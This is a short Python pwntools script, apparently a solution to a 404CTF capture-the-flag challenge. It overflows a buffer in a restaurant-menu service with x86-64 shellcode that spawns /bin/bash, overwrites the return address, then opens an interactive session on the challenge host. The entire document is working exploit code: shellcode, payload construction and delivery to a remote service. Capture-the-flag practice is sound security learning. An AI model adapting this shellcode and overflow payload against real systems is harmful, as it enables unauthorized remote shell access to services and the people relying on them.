from pwn import *

# Define variables for the exploit
offset = 48
return_addr = 0x400640
shellcode = b'\xeb\x0b\x5f\x48\x31\xd2\x52\x5e\x6a\x3b\x58\x0f\x05\xe8\xf0\xff\xff\xff\x2f\x2f\x2f\x2f\x62\x69\x6e\x2f\x2f\x2f\x2f\x62\x61\x73\x68\x00'
payload = shellcode + b'A' * (offset - len(shellcode)) + p64(return_addr)

# Connect to the remote service
c = remote('challenges.404ctf.fr', 31957)

# Handle initial interaction
c.recvuntil(b"Voulez-vous commander un plat ou plus ?")
c.sendline(b"11")

# Send the payload when prompted
c.recvuntil(b"Choisissez un plat.")
c.sendline(payload)

# Switch to interactive mode to handle manual interaction or observe the outcome
c.interactive()
